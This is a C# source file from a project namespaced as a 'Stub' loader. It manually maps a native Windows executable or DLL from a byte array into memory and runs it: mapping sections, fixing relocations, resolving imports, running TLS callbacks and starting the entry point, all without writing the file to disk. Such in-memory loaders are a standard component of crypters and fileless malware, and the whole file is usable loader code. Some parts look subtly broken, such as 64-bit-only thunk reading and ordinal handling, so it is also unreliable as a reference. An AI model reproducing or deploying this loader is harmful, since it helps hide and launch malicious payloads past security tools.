using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace NRE.Stub.Loaders
{
    /// <summary>
    /// Manual map a native PE (EXE or DLL) and execute. EXE: run entry point in new thread. DLL: map and call DllMain.
    /// </summary>
    public static class NativePELoader
    {
    private const uint PAGE_READWRITE = 0x04;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint MEM_RELEASE = 0x8000;
    private const ushort IMAGE_DIRECTORY_ENTRY_TLS = 9;
    private const ushort IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
    private const ushort IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
    private const ushort IMAGE_DIRECTORY_ENTRY_TLS_DIR = 9;
    private const uint IMAGE_REL_BASED_HIGHLOW = 3;
    private const uint IMAGE_REL_BASED_DIR64 = 10;
    private const uint DLL_PROCESS_ATTACH = 1;
    private const uint IMAGE_SCN_CNT_CODE = 0x20;
    private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    private const uint IMAGE_SCN_MEM_READ = 0x40000000;
    private const uint IMAGE_SCN_MEM_WRITE = 0x80000000;

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibraryW(string lpLibFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void LoadAndExecute(byte[] peBytes, bool isDll)
    {
        if (peBytes == null || peBytes.Length < 64) return;
        if (BitConverter.ToUInt16(peBytes, 0) != 0x5A4D) return; // MZ

        var eLfanew = BitConverter.ToInt32(peBytes, 0x3C);
        if (BitConverter.ToUInt32(peBytes, eLfanew) != 0x00004550) return; // PE

        var machine = BitConverter.ToUInt16(peBytes, eLfanew + 4);
        bool is64 = (machine == 0x8664);
        var numberOfSections = BitConverter.ToUInt16(peBytes, eLfanew + 6);
        var sizeOfOptionalHeader = BitConverter.ToUInt16(peBytes, eLfanew + 20);
        var optHeaderOff = eLfanew + 24;
        var magic = BitConverter.ToUInt16(peBytes, optHeaderOff);
        int entryRva, imageBaseOff, dataDirOff;
        if (magic == 0x20B)
        {
            entryRva = BitConverter.ToInt32(peBytes, optHeaderOff + 16);
            imageBaseOff = optHeaderOff + 24;
            dataDirOff = optHeaderOff + 112;
        }
        else
        {
            entryRva = BitConverter.ToInt32(peBytes, optHeaderOff + 16);
            imageBaseOff = optHeaderOff + 28;
            dataDirOff = optHeaderOff + 96;
        }

        var sizeOfImage = BitConverter.ToUInt32(peBytes, optHeaderOff + 56);
        var sizeOfHeaders = BitConverter.ToUInt32(peBytes, optHeaderOff + 60);
        ulong preferredBase = magic == 0x20B
            ? BitConverter.ToUInt64(peBytes, imageBaseOff)
            : BitConverter.ToUInt32(peBytes, imageBaseOff);
        IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) return;

        try
        {
            Marshal.Copy(peBytes, 0, baseAddr, (int)Math.Min(sizeOfHeaders, peBytes.Length));

            var sectionTableOff = optHeaderOff + sizeOfOptionalHeader;
            for (int i = 0; i < numberOfSections; i++)
            {
                var sectionOff = sectionTableOff + i * 40;
                var virtualAddr = BitConverter.ToUInt32(peBytes, sectionOff + 12);
                var rawSize = BitConverter.ToUInt32(peBytes, sectionOff + 16);
                var rawAddr = BitConverter.ToUInt32(peBytes, sectionOff + 20);
                if (rawSize > 0 && rawAddr < peBytes.Length)
                {
                    IntPtr dest = (IntPtr)(baseAddr.ToInt64() + (int)virtualAddr);
                    var copyLen = (int)Math.Min(rawSize, peBytes.Length - rawAddr);
                    Marshal.Copy(peBytes, (int)rawAddr, dest, copyLen);
                }
            }

            var delta = (long)baseAddr - (long)preferredBase;
            if (delta != 0)
            {
                var relocRva = BitConverter.ToUInt32(peBytes, dataDirOff + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8);
                var relocSize = BitConverter.ToUInt32(peBytes, dataDirOff + IMAGE_DIRECTORY_ENTRY_BASERELOC * 8 + 4);
                if (relocRva != 0 && relocSize != 0)
                    ApplyRelocations(baseAddr, relocRva, relocSize, is64, delta);
            }

            var importRva = BitConverter.ToUInt32(peBytes, dataDirOff + IMAGE_DIRECTORY_ENTRY_IMPORT * 8);
            if (importRva != 0)
                ResolveImports(peBytes, baseAddr, importRva);

            SetSectionPermissions(peBytes, baseAddr, optHeaderOff, sizeOfOptionalHeader, numberOfSections);

            var tlsRva = BitConverter.ToUInt32(peBytes, dataDirOff + IMAGE_DIRECTORY_ENTRY_TLS * 8);
            if (tlsRva != 0)
                ExecuteTlsCallbacks(baseAddr, tlsRva, is64);

            if (isDll)
            {
                var dllMainRva = entryRva;
                if (dllMainRva != 0)
                {
                    IntPtr dllMain = (IntPtr)(baseAddr.ToInt64() + dllMainRva);
                    var fn = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(dllMain, typeof(DllMainDelegate));
                    fn(baseAddr, DLL_PROCESS_ATTACH, IntPtr.Zero);
                }
            }
            else
            {
                IntPtr entry = (IntPtr)(baseAddr.ToInt64() + entryRva);
                uint tid;
                IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, entry, IntPtr.Zero, 0, out tid);
                if (hThread != IntPtr.Zero)
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
        finally
        {
            // Don't free for DLL - it stays loaded. For EXE we could wait then free; for simplicity leave committed.
            // VirtualFree(baseAddr, 0, MEM_RELEASE);
        }
    }

        private delegate bool DllMainDelegate(IntPtr hModule, uint reason, IntPtr reserved);

        private delegate void TlsCallbackDelegate(IntPtr hModule, uint reason, IntPtr reserved);

        private static void SetSectionPermissions(byte[] peBytes, IntPtr baseAddr, int optHeaderOff, ushort sizeOfOptionalHeader, ushort numberOfSections)
        {
            int sectionTableOff = optHeaderOff + sizeOfOptionalHeader;
            for (int i = 0; i < numberOfSections; i++)
            {
                int secOff = sectionTableOff + i * 40;
                uint characteristics = BitConverter.ToUInt32(peBytes, secOff + 36);
                uint virtualAddr = BitConverter.ToUInt32(peBytes, secOff + 12);
                uint virtualSize = BitConverter.ToUInt32(peBytes, secOff + 8);
                if (virtualSize == 0) continue;
                IntPtr sectionAddr = (IntPtr)(baseAddr.ToInt64() + (int)virtualAddr);
                uint prot = NRE.Core.Common.NativeMethods.PAGE_READONLY;
                if ((characteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
                    prot = (characteristics & IMAGE_SCN_MEM_WRITE) != 0 ? NRE.Core.Common.NativeMethods.PAGE_EXECUTE_READWRITE : NRE.Core.Common.NativeMethods.PAGE_EXECUTE_READ;
                else if ((characteristics & IMAGE_SCN_MEM_WRITE) != 0)
                    prot = NRE.Core.Common.NativeMethods.PAGE_READWRITE;
                uint oldProt;
                NRE.Core.Common.NativeMethods.VirtualProtect(sectionAddr, (UIntPtr)virtualSize, prot, out oldProt);
            }
        }

        private static void ExecuteTlsCallbacks(IntPtr baseAddr, uint tlsDirRva, bool is64)
        {
            IntPtr tlsDir = (IntPtr)(baseAddr.ToInt64() + (int)tlsDirRva);
            int offsetAddressOfCallbacks = is64 ? 24 : 12;
            uint callbacksRva = (uint)Marshal.ReadInt32(tlsDir, offsetAddressOfCallbacks);
            if (callbacksRva == 0) return;
            IntPtr callbackArray = (IntPtr)(baseAddr.ToInt64() + (int)callbacksRva);
            while (true)
            {
                IntPtr cb = is64 ? (IntPtr)Marshal.ReadInt64(callbackArray) : (IntPtr)Marshal.ReadInt32(callbackArray);
                if (cb == IntPtr.Zero) break;
                try
                {
                    var fn = (TlsCallbackDelegate)Marshal.GetDelegateForFunctionPointer(cb, typeof(TlsCallbackDelegate));
                    fn(baseAddr, DLL_PROCESS_ATTACH, IntPtr.Zero);
                }
                catch { }
                callbackArray = (IntPtr)(callbackArray.ToInt64() + (is64 ? 8 : 4));
            }
        }

        private static void ApplyRelocations(IntPtr baseAddr, uint relocRva, uint relocSize, bool is64, long delta)
        {
            uint off = 0;
        while (off < relocSize)
        {
            var pageRva = (uint)Marshal.ReadInt32(baseAddr, (int)(relocRva + off));
            var blockSize = (uint)Marshal.ReadInt32(baseAddr, (int)(relocRva + off + 4));
            if (pageRva == 0 && blockSize == 0) break;
            for (int i = 8; i < blockSize; i += 2)
            {
                var entry = Marshal.ReadInt16(baseAddr, (int)(relocRva + off + i));
                var type = (uint)(entry >> 12);
                var patchRva = pageRva + (uint)(entry & 0xFFF);
                IntPtr patchAddr = (IntPtr)(baseAddr.ToInt64() + (int)patchRva);
                if (type == IMAGE_REL_BASED_HIGHLOW)
                {
                    var val = Marshal.ReadInt32(patchAddr);
                    Marshal.WriteInt32(patchAddr, (int)(val + delta));
                }
                else if (is64 && type == IMAGE_REL_BASED_DIR64)
                {
                    var val = Marshal.ReadInt64(patchAddr);
                    Marshal.WriteInt64(patchAddr, val + delta);
                }
            }
            off += blockSize;
            }
        }

        private static void ResolveImports(byte[] pe, IntPtr baseAddr, uint importRva)
        {
            uint off = 0;
            while (true)
            {
                var origFirstThunk = (uint)Marshal.ReadInt32(baseAddr, (int)(importRva + off));
                var nameRva = (uint)Marshal.ReadInt32(baseAddr, (int)(importRva + off + 12));
                var firstThunk = (uint)Marshal.ReadInt32(baseAddr, (int)(importRva + off + 16));
                if (nameRva == 0) break;

                var dllName = ReadCStringFromMapped(baseAddr, nameRva);
                if (string.IsNullOrEmpty(dllName)) break;
                IntPtr hMod = LoadLibraryW(dllName);
                if (hMod == IntPtr.Zero) return;

                var thunkRva = origFirstThunk != 0 ? origFirstThunk : firstThunk;
                var iatRva = firstThunk;
                while (true)
                {
                    var entry = Marshal.ReadInt64(baseAddr, (int)thunkRva);
                    if (entry == 0) break;
                    int ordOrHint;
                    uint nameAddrRva;
                    var entryU = (ulong)entry;
                    if ((entryU & 0x8000000000000000UL) != 0)
                    {
                        ordOrHint = (int)(entryU & 0x7FFF);
                        nameAddrRva = 0;
                    }
                    else
                    {
                        nameAddrRva = (uint)(entryU & 0x7FFFFFFF);
                        ordOrHint = Marshal.ReadInt16(baseAddr, (int)nameAddrRva);
                        nameAddrRva += 2;
                    }

                    IntPtr proc;
                    if (nameAddrRva != 0)
                    {
                        var name = ReadCStringFromMapped(baseAddr, nameAddrRva);
                        proc = GetProcAddress(hMod, name);
                    }
                    else
                    {
                        proc = GetProcAddress(hMod, ordOrHint.ToString());
                    }
                    Marshal.WriteInt64(baseAddr, (int)iatRva, proc.ToInt64());
                    thunkRva += 8;
                    iatRva += 8;
                }
                off += 20;
            }
        }

        private static string ReadCStringFromMapped(IntPtr baseAddr, uint rva)
        {
            IntPtr p = (IntPtr)(baseAddr.ToInt64() + (int)rva);
            var list = new List<byte>();
            while (true)
            {
                var b = Marshal.ReadByte(p);
                if (b == 0) break;
                list.Add(b);
                p = (IntPtr)(p.ToInt64() + 1);
            }
            return System.Text.Encoding.ASCII.GetString(list.ToArray());
        }
    }
}
